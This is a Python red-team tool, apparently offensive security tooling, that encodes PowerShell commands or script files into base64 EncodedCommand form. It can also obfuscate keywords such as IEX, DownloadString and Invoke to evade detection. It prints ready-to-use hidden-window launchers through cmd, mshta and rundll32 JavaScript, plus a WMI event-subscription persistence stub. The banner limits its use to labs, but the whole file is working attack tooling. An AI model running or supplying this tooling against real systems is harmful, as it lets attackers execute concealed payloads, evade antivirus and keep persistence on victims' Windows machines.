import base64
import argparse
import os

def print_banner():
    banner = r"""
┏┓┏┓┏┓      ┓    
┃┃┗┓┣ ┏┓┏┏┓┏┫┏┓┏┓
┣┛┗┛┗┛┛┗┗┗┛┗┻┗ ┛ 
┏                
╋┏┓┏┓            
┛┗┛┛  ┓ ┓ ┏┓┏┓   
┏╋┏┓┏┓┃╋┣┓┃┃┃┃   
┛┗┗ ┗┻┗┗┛┗┗┛┣┛ 

  [🔬] Researched by d3hvck
  [+] USAGE:
  [+] The program designed to use agains Windows Labs, Do not use for illegal purpouse
    If you wanna encrypt command then use -c option
    python3 Exp_Encoder.py -c "powershell command" -o
    If you want to encrypt pre maded PowerShell ps1 file then use -f option
    python3 Exp_Encoder.py -f powershellfile.ps1 -o
"""
    print(banner)

def encode_ps_command(command):
    utf16le_bytes = command.encode('utf-16le')
    b64_bytes = base64.b64encode(utf16le_bytes)
    return b64_bytes.decode()

def simple_obfuscate(command):
    replacements = {
        'powershell': 'pOwErsHeLl',
        'Invoke': 'Inv`oke',
        'DownloadString': 'Downl`oadString',
        'FromBase64String': 'Fr`omBase64String',
        'IEX': 'I`EX',
        'New-Object': 'N`ew-Object'
    }
    for k, v in replacements.items():
        command = command.replace(k, v)
    return command

def read_ps_file(file_path):
    if not os.path.exists(file_path):
        print(f"[!] Error: File '{file_path}' not found")
        exit(1)
    with open(file_path, 'r') as f:
        return f.read()

def generate_payloads(encoded_command):
    print("\n[+] EncodedCommand only:")
    print(f"powershell -nop -w hidden -EncodedCommand {encoded_command}\n")

    print("[+] CMD Launcher:")
    print(f'cmd.exe /c powershell -nop -w hidden -EncodedCommand {encoded_command}\n')

    print("[+] WMI Event Consumer (for persistence):")
    print(f'powershell -c "Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments {{...}}"')
    print(f'# Use encoded command in that context: {encoded_command}\n')

    print("[+] MSHTA Launcher:")
    print(f'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Run(\'powershell -nop -w hidden -EncodedCommand {encoded_command}\');close();"\n')

    print("[+] RUNDLL32 Launcher:")
    print(f'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write(\'<script>self.close();new ActiveXObject("WScript.Shell").Run("powershell -nop -w hidden -EncodedCommand {encoded_command}");</script>\');"\n')

if __name__ == "__main__":
    print_banner()
    parser = argparse.ArgumentParser(description="PowerShell Red Team Encoder")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-c", "--command", help="PowerShell command to encode")
    group.add_argument("-f", "--file", help="PowerShell script file to encode")
    parser.add_argument("-o", "--obfuscate", action="store_true", help="Apply keyword obfuscation")
    args = parser.parse_args()

    if args.file:
        input_command = read_ps_file(args.file)
    else:
        input_command = args.command

    if args.obfuscate:
        input_command = simple_obfuscate(input_command)

    encoded = encode_ps_command(input_command)
    generate_payloads(encoded)